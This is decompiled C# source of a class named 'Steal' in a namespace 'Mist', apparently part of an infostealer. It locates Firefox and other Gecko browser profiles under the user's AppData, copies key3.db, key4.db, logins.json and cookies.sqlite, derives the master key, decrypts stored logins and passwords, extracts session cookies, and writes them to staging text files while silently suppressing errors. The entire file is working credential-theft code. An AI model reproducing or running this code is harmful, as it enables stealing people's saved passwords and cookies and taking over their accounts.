using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Mist
{
	// Token: 0x02000046 RID: 70
	internal class Steal
	{
		// Token: 0x060001ED RID: 493 RVA: 0x0000EB60 File Offset: 0x0000CD60
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list;
			}
			List<string> result;
			try
			{
				foreach (string path in Directory.GetDirectories(baseDirectory))
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in Steal.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			catch
			{
				result = list;
			}
			return result;
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0000EC98 File Offset: 0x0000CE98
		public static void Creds(string profile, string browser_name, string profile_name)
		{
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					Steal.Lopos(profile, Steal.p3k(Steal.CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
				}
				Steal.Lopos(profile, Steal.p4k(Steal.CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001EF RID: 495 RVA: 0x0000ED08 File Offset: 0x0000CF08
		public static void Cookies()
		{
			List<string> list = new List<string>();
			list.AddRange(Steal.FindPaths(Steal.LocalAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Steal.FindPaths(Steal.RoamingAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string browser_name = text.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
				string name = Steal.GetName(fullName);
				Steal.CookMhn(fullName, browser_name, name);
				string text2 = "";
				foreach (string str in Steal.Cookies_Gecko)
				{
					text2 += str;
				}
				if (text2 != "")
				{
					File.WriteAllText(Help.Cookies + "\\Cookies_Mozilla.txt", text2, Encoding.Default);
				}
			}
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0000EE80 File Offset: 0x0000D080
		public static void Passwords()
		{
			List<string> list = new List<string>();
			list.AddRange(Steal.FindPaths(Steal.LocalAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Steal.FindPaths(Steal.RoamingAppData, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string browser_name = text.Contains(Steal.RoamingAppData) ? Steal.prbn(fullName) : Steal.plbn(fullName);
				string name = Steal.GetName(fullName);
				Steal.Creds(fullName, browser_name, name);
				string text2 = "";
				foreach (string str in Steal.GeckoBrowsers)
				{
					text2 = text2 + str + Environment.NewLine;
				}
				if (text2 != "")
				{
					File.WriteAllText(Help.Passwords + "\\Passwords_Mozilla.txt", text2, Encoding.Default);
				}
			}
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0000EFFC File Offset: 0x0000D1FC
		private static string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[array.Length - 1];
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x060001F2 RID: 498 RVA: 0x0000F040 File Offset: 0x0000D240
		public static string CreateTempCopy(string filePath)
		{
			string text = Steal.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x060001F3 RID: 499 RVA: 0x0000F05C File Offset: 0x0000D25C
		public static string CreateTempPath()
		{
			return Path.Combine(Steal.TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString());
		}

		// Token: 0x060001F4 RID: 500 RVA: 0x0000F0BC File Offset: 0x0000D2BC
		public static void CookMhn(string profile, string browser_name, string profile_name)
		{
			try
			{
				CNT cnt = new CNT(Steal.CreateTempCopy(Path.Combine(profile, "cookies.sqlite")));
				cnt.ReadTable("moz_cookies");
				for (int i = 0; i < cnt.RowLength; i++)
				{
					try
					{
						Steal.domains.Add(cnt.ParseValue(i, "host").Trim());
						Steal.Cookies_Gecko.Add(string.Concat(new string[]
						{
							cnt.ParseValue(i, "host").Trim(),
							"\t",
							(cnt.ParseValue(i, "isSecure") == "1").ToString(),
							"\t",
							cnt.ParseValue(i, "path").Trim(),
							"\t",
							(cnt.ParseValue(i, "isSecure") == "1").ToString(),
							"\t",
							cnt.ParseValue(i, "expiry").Trim(),
							"\t",
							cnt.ParseValue(i, "name").Trim(),
							"\t",
							cnt.ParseValue(i, "value"),
							Environment.NewLine
						}));
					}
					catch
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001F5 RID: 501 RVA: 0x0000F250 File Offset: 0x0000D450
		public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
		{
			try
			{
				string path = Steal.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (File.Exists(path))
				{
					foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
					{
						JsonValue jsonValue = (JsonValue)obj;
						Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
						Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
						string text = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
						string text2 = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
						Steal.credential.Add(string.Concat(new string[]
						{
							"URL : ",
							jsonValue["hostname"],
							Environment.NewLine,
							"Login: ",
							text,
							Environment.NewLine,
							"Password: ",
							text2,
							Environment.NewLine
						}));
						Steal.GeckoBrowsers.Add(string.Concat(new string[]
						{
							"URL : ",
							jsonValue["hostname"],
							Environment.NewLine,
							"Login: ",
							text,
							Environment.NewLine,
							"Password: ",
							text2,
							Environment.NewLine
						}));
						Steal.count++;
					}
					for (int i = 0; i < Steal.credential.Count<string>(); i++)
					{
						Steal.GeckoBrowsers.Add(string.Concat(new string[]
						{
							"Browser : ",
							browser_name,
							Environment.NewLine,
							"Profile : ",
							profile_name,
							Environment.NewLine,
							Steal.credential[i]
						}));
					}
					Steal.credential.Clear();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060001F6 RID: 502 RVA: 0x0000F534 File Offset: 0x0000D734
		private static byte[] p4k(string file)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (!File.Exists(file))
				{
					result = array;
				}
				else
				{
					CNT cnt = new CNT(file);
					cnt.ReadTable("metaData");
					string s = cnt.ParseValue(0, "item1");
					string s2 = cnt.ParseValue(0, "item2)");
					Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
					byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
					byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
					Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
					gecko2.го7па();
					Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.None);
					cnt.ReadTable("nssPrivate");
					int rowLength = cnt.RowLength;
					string s3 = string.Empty;
					for (int i = 0; i < rowLength; i++)
					{
						if (cnt.ParseValue(i, "a102") == Encoding.Default.GetString(Steal.Key4MagicNumber))
						{
							s3 = cnt.ParseValue(i, "a11");
							break;
						}
					}
					Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
					objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
					objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
					gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
					gecko2.го7па();
					array = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
					result = array;
				}
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x060001F7 RID: 503 RVA: 0x0000F760 File Offset: 0x0000D960
		private static byte[] p3k(string file)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (!File.Exists(file))
				{
					result = array;
				}
				else
				{
					new DataTable();
					Gecko9 berkeleyDB = new Gecko9(file);
					Gecko7 gecko = new Gecko7(Steal.vbv(berkeleyDB, (string x) => x.Equals("password-check")));
					string hexString = Steal.vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
					Gecko8 gecko2 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Steal.ConvertHexStringToByteArray(gecko.EntrySalt));
					gecko2.го7па();
					Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, Steal.ConvertHexStringToByteArray(gecko.Passwordcheck), PaddingMode.None);
					Gecko4 gecko3 = Gecko1.Create(Steal.ConvertHexStringToByteArray(Steal.vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
					Gecko8 gecko4 = new Gecko8(Steal.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
					gecko4.го7па();
					Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
					if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
					{
						array = gecko5.Objects[0].Objects[3].ObjectData;
						result = array;
					}
					else
					{
						Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
						result = array;
					}
				}
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x060001F8 RID: 504 RVA: 0x0000F9CC File Offset: 0x0000DBCC
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x060001F9 RID: 505 RVA: 0x0000FA40 File Offset: 0x0000DC40
		private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in berkeleyDB.Keys)
				{
					if (predicate(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch (Exception)
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x060001FA RID: 506 RVA: 0x0000FACC File Offset: 0x0000DCCC
		private static string prbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x060001FB RID: 507 RVA: 0x0000FB48 File Offset: 0x0000DD48
		private static string plbn(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x04000104 RID: 260
		public static int count = 0;

		// Token: 0x04000105 RID: 261
		public static int count_cookies = 0;

		// Token: 0x04000106 RID: 262
		public static List<string> domains = new List<string>();

		// Token: 0x04000107 RID: 263
		public static List<string> Cookies_Gecko = new List<string>();

		// Token: 0x04000108 RID: 264
		public static List<string> passwors = new List<string>();

		// Token: 0x04000109 RID: 265
		public static List<string> credential = new List<string>();

		// Token: 0x0400010A RID: 266
		public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

		// Token: 0x0400010B RID: 267
		public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

		// Token: 0x0400010C RID: 268
		public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

		// Token: 0x0400010D RID: 269
		public static readonly byte[] Key4MagicNumber = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};

		// Token: 0x0400010E RID: 270
		public static List<string> GeckoBrowsers = new List<string>();
	}
}
